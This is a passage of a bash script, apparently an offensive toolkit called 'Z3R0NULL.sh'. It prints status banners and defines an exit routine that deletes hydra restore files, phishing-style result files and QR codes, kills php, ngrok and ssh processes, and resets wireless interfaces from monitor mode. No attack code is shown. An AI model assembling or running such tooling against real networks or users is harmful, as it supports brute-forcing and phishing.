    echo -e "${reset}"
}

#SSH Server Started
ssh_started(){
    echo -e "${greenbold}"
    echo -e "                         --------------------   "
    echo -e "                      [${reset}*${greenbold}] SSH SERVER STARTED [${reset}*${greenbold}]"
    echo -e "                         --------------------   "
    echo -e "${reset}"
}

#Starting Monitor Mode
monitor_mode_starting(){
  echo -e "${orangebold}"
  echo -e "                    ----------------------------   "
  echo -e "                 [${reset}*${orangebold}]    STARTING MONITOR MODE    [${reset}*${orangebold}]"
  echo -e "                    ----------------------------   "
  echo -e "${reset}"
}

#Monitor Mode Started
monitor_mode_started(){
  echo -e "${greenbold}"
  echo -e "                    ----------------------------   "
  echo -e "                 [${reset}*${greenbold}]    MONITOR MODE STARTED    [${reset}*${greenbold}]"
  echo -e "                    ----------------------------   "
  echo -e "${reset}"
}

#Restarting Network
network_restarting(){
  echo -e "${orangebold}"
  echo -e "                    ----------------------------   "
  echo -e "                 [${reset}*${orangebold}]     RESTARTING NETWORK     [${reset}*${orangebold}]"
  echo -e "                    ----------------------------   "
  echo -e "${reset}"
}

#Restarting Network
network_restarted(){
  echo -e "${greenbold}"
  echo -e "                    ----------------------------   "
  echo -e "                 [${reset}*${greenbold}]     NETWORK  RESTARTED     [${reset}*${greenbold}]"
  echo -e "                    ----------------------------   "
  echo -e "${reset}"
}

#Error 404
error_404(){
    echo -e "${redbold}"
    echo -e "                   _  _   _   _   _          _       "
    echo -e "                  |_ |_) |_) / \ |_)   |_|_ / \ |_|_ "
    echo -e "                  |_ | \ | \ \_/ | \     |  \_/   |  "
    echo -e "                        [${reset}*${redbold}] INVALID OPTION [${reset}*${redbold}]       "
    echo -e "${reset}"
}

#Exit Script
exit_script(){
    cd ${script_dir}/.files/ || exit_script
    rm -rf link > /dev/null 2>&1
    rm -rf *.csv > /dev/null 2>&1
    rm -rf *.png > /dev/null 2>&1
    rm -rf feh* > /dev/null 2>&1
    rm -rf hydra.restore
    cd ${script_dir}/ || exit_script
    rm -rf ${script_dir}/.files/FILERESULTS.json
    rm -rf ${script_dir}/*QRCode.png
    rm -rf ${script_dir}/.files/URLRESULTS.json
    pkill -f -2 php > /dev/null 2>&1
    killall -2 php > /dev/null 2>&1
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
    pkill -f -2 ssh > /dev/null 2>&1
    killall ssh > /dev/null 2>&1

    if [[ ${NETWORKRST} == *TRUE* ]];then
    clear
    banner
    network_restarting
    sleep 1
    ifconfig wlan0 down &>/dev/null
    ifconfig wlan1 down &>/dev/null
    ifconfig wlan2 down &>/dev/null
    airmon-ng stop wlan0mon &>/dev/null
    airmon-ng stop wlan1mon &>/dev/null
    airmon-ng stop wlan2mon &>/dev/null
    iwconfig wlan0 mode managed &>/dev/null
    iwconfig wlan1 mode managed &>/dev/null
    iwconfig wlan2 mode managed &>/dev/null
    ifconfig wlan0 up &>/dev/null
    ifconfig wlan1 up &>/dev/null
    ifconfig wlan2 up &>/dev/null
    systemctl restart NetworkManager &>/dev/null
    clear
    banner
    network_restarted
    sleep 1
    fi

    clear
    banner
    echo -e "${redbold}[${reset}*${redbold}] YOU WANT EXIT?${reset} ${whitebold}(Y/N)${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' safe_exit

    if [[ ${safe_exit} == "Y" ]] || [[ ${safe_exit} == "y" ]];then
    clear
    banner
    notify-send "Z3R0NULL.sh" "Exit Sucessful.. Thanks For Use My Script :D"
    exit
    elif [[ ${safe_exit} == "N" ]] || [[ ${safe_exit} == "n" ]];then
    #Check Network Reset
    NETWORKRST="FALSE"
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    NETWORKRST="FALSE"
    exit_script
    fi
}

#Run Script
if [[ ${1} == "" ]];then
    check_root
fi